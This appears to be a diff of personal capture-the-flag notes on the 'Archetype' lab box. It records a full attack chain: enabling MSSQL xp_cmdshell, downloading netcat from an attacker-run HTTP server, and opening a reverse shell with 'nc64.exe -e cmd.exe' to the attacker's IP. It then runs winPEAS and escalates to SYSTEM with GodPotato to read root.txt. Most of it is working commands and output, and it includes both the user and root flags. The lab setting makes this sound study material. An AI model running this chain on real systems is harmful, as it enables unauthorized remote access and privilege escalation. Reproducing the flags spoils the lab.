@@ -573,7 +573,7 @@ output
 SQL (ARCHETYPE\sql_svc  dbo@msdb)>
 ```
 
-flag got it 3e7b102e78218e935bf3f4951fec21a3
+flag for user 3e7b102e78218e935bf3f4951fec21a3
 
 
 
@@ -592,25 +592,194 @@ RECONFIGURE; — priv
 EXEC sp_configure 'xp_cmdshell', 1; — priv
 RECONFIGURE; — priv
 SQL> EXEC xp_cmdshell 'net user';
+
+run this if i dont see the advanced option selection?
+EXEC sp_configure 'show advanced options', 1;
 ```
 
+flag for root
 
-also missed downloading netcat64 for windows, 
-then 
+first establish reverse shell now that i can run `xp_cmdshell "net user"`
 ```bash
+#download nc for windows
+wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+
+#establish server inside the ~/Downloads dir
 sudo python3 -m http.server 80
-sudo nc -lvnp 443
-#upload nc to windows
-SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
-http://10.10.14.9/nc64.exe -outfile nc64.exe"
 
-#then bind windows cmd to nc
-SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
-10.10.14.9 443"
+#test server on a separate terminal with tun0 address
+wget 10.10.14.18
 
-#upload peas
-powershell
-wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
-#execute
-PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
+#response:
+10.10.14.18 - - [23/Mar/2025 10:30:28] "GET / HTTP/1.1" 200 -
+
+#it is working. proceed
+
+
+#setup listener on attacker
+nc -lvnp 4444
+
+#try pinging
+xp_cmdshell "powershell -c ping -n 1 10.10.14.18"
+output                                                     
+--------------------------------------------------------   
+NULL                                                       
+Pinging 10.10.14.18 with 32 bytes of data:                 
+Reply from 10.10.14.18: bytes=32 time=270ms TTL=63         
+NULL                                                       
+Ping statistics for 10.10.14.18:                           
+    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),   
+Approximate round trip times in milli-seconds:             
+    Minimum = 270ms, Maximum = 270ms, Average = 270ms      
+NULL
+
+#try to send nc64.exe to target machine
+#10.10.14.18/23 is my tun0. 10.10.14.18/23 corresponds to the ~/Downloads dir
+xp_cmdshell "powershell -c wget http://10.10.14.18/nc64.exe -outfile nc64.exe"
+
+wget : Access to the path 'C:\Windows\system32\nc64.exe' is denied.                
+At line:1 char:1                                                                   
++ wget http://10.10.14.18/nc64.exe -outfile nc64.exe                               
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                               
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], UnauthorizedAccessException   
+    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand   
+                                                                                   
+NULL
+
+# need to save it to another folder
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; ls"
+
+
+#check with ls
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; ls"
+output                                                                             
+--------------------------------------------------------------------------------   
+NULL                                                                               
+NULL                                                                               
+    Directory: C:\Users\sql_svc\Downloads                                          
+NULL                                                                               
+NULL                                                                               
+Mode                LastWriteTime         Length Name                                                                     
+----                -------------         ------ ----                                                                     
+-a----        3/22/2025   6:37 PM         207585 nc64.exe                                                                 
+NULL                                                                               
+NULL                                                                               
+NULL                                                                               
+
+
+#execute nc64 in the windows machine
+xp_cmdshell "powershell -c C:\Users\sql_svc\Downloads\nc64.exe 10.10.14.18 4444 -e cmd.exe"
+Program 'nc64.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1
+
+
+#tried to download a different one. same error.
+
+#https://github.com/vinsworldcom/NetCat64/releases
+#getting it from here worked
+
+
+xp_cmdshell "powershell -c C:\Users\sql_svc\Downloads\nc64.exe  -e cmd.exe 10.10.14.18 4444"
+# switch the order for the command to make it work properly (for windows i guess)
+
+
+#upload https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/winPEASx64.exe
+C:\Users\sql_svc\Downloads>powershell -c wget http://10.10.14.18/winPEASx64.exe -outfile winPEASx64.exe
+
+.\winPEASx64.exe userinfo
+#reveals in red:
+    SeAssignPrimaryTokenPrivilege: DISABLED
+    SeIncreaseQuotaPrivilege: DISABLED
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: DISABLED
+
+#SeImpersonatePrivilege is in RED!!!
+
+#google search reveals it is vulnerable to a potato attack
+#Potato attacks - Various versions exist:
+
+#PrintSpoofer
+#JuicyPotato (older Windows versions)
+#RoguePotato
+#GodPotato (works on newer Windows systems)
+
+
+#upload https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+
+C:\Users\sql_svc\Downloads>powershell -c wget http://10.10.14.18/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
+
+#run godpotato
+C:\Users\sql_svc\Downloads>GodPotato-NET4.exe -cmd "cmd /c dir"       
+GodPotato-NET4.exe -cmd "cmd /c dir"
+[*] CombaseModule: 0x140716202721280
+[*] DispatchTable: 0x140716205034688
+[*] UseProtseqFunction: 0x140716204411616
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\582d53a9-2732-4dd2-935b-fa21c6739a88\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000f402-0808-ffff-e3f6-6b8ce2e8087a
+[*] DCOM obj OXID: 0x373ab039ec26a246
+[*] DCOM obj OID: 0x36f169f8f4c56f15
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 848 Token:0x820  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2244
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+ Directory of C:\Users\sql_svc\Downloads
+03/22/2025  07:24 PM    <DIR>          .
+03/22/2025  07:24 PM    <DIR>          ..
+03/22/2025  07:24 PM            57,344 GodPotato-NET4.exe
+03/22/2025  06:55 PM            55,296 nc64.exe
+03/22/2025  07:10 PM                 0 powershell
+03/22/2025  07:11 PM        10,144,256 winPEASx64.exe
+               4 File(s)     10,256,896 bytes
+               2 Dir(s)  10,708,557,824 bytes free
+
+
+
+#get the flag
+C:\Users\sql_svc\Downloads>GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+[*] CombaseModule: 0x140716202721280
+[*] DispatchTable: 0x140716205034688
+[*] UseProtseqFunction: 0x140716204411616
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\58428f5d-ce0c-45f1-b9aa-29581c6c0ff7\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00006402-0a00-ffff-ae85-9f947d31be4a
+[*] DCOM obj OXID: 0x3b7dccadb517dcc8
+[*] DCOM obj OID: 0xefeae4f0e9e1468a
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 848 Token:0x820  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2040
+b91ccec3305e98240082d4474b848528
+
 ```
+
